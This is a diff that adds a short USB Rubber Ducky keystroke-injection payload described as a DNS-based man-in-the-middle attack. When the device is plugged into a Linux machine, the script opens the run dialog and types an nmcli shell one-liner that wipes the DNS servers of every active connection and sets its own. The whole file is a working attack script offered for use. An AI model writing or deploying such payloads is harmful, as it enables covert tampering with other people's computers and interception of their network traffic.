@@ -1,0 +1,7 @@
+REM Set up a DNS-based MITM attack.
+
+DELAY 1000
+ALT F2
+DELAY 100
+STRING sh -c 'function mitm() { for ((i=0;i<10;i++)); do nmcli connection modify "$1" -ipv4.dns 0; done; nmcli connection modify "$1" +ipv4.dns 8.8.8.8; }; for x in $(nmcli -t connection show --active | cut -d: -f1); do mitm "$x"; done;'
+ENTER
